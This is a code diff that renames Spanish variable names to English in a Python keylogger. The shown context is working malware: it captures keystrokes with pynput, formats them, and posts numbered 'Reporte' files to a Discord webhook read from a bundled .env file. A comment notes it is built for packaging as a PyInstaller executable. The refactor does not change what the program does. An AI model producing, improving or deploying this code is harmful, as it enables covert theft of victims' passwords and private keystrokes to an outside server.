@@ -6,25 +6,25 @@ from dotenv import load_dotenv
 from pynput.keyboard import Key, Listener
 
 
-def resource_path(nombre: str) -> str:
+def resource_path(name: str) -> str:
     # Dentro de un .exe hecho con PyInstaller, los recursos se extraen en sys._MEIPASS
     base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
-    return os.path.join(base, nombre)
+    return os.path.join(base, name)
 
 
 keys = []
 load_dotenv(resource_path(".env"))
 WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL")
-_numero_lote = 0
+_counter = 0
 
 
-def send_report(contenido: str, mensaje: str = "Reporte", nombre_archivo: str = "reporte.txt"):
+def send_report(content: str, message: str = "Reporte", file_name: str = "reporte.txt"):
     if not WEBHOOK_URL:
         raise RuntimeError("No se encontró la URL del webhook (revisa tu .env)")
     r = requests.post(
         WEBHOOK_URL,
-        data={"content": mensaje},
-        files={"file": (nombre_archivo, contenido.encode("utf-8"), "text/plain")},
+        data={"content": message},
+        files={"file": (file_name, content.encode("utf-8"), "text/plain")},
         timeout=30,
     )
     r.raise_for_status()
@@ -41,7 +41,7 @@ def on_press(key):
 
 
 def write_file(keys):
-    global _numero_lote
+    global _counter
     with io.StringIO() as f:
         for key in keys:
             if key == Key.space:
@@ -80,13 +80,13 @@ def write_file(keys):
             else:
                 f.write("[{0}]".format(key))
 
-            contenido = f.getvalue()
+            content = f.getvalue()
 
-    _numero_lote += 1
+    _counter += 1
     send_report(
-        contenido,
-        mensaje=f"Reporte #{_numero_lote}",
-        nombre_archivo=f"reporte_{_numero_lote}.txt",
+        content,
+        message=f"Reporte #{_counter}",
+        file_name=f"reporte_{_counter}.txt",
     )
 
 
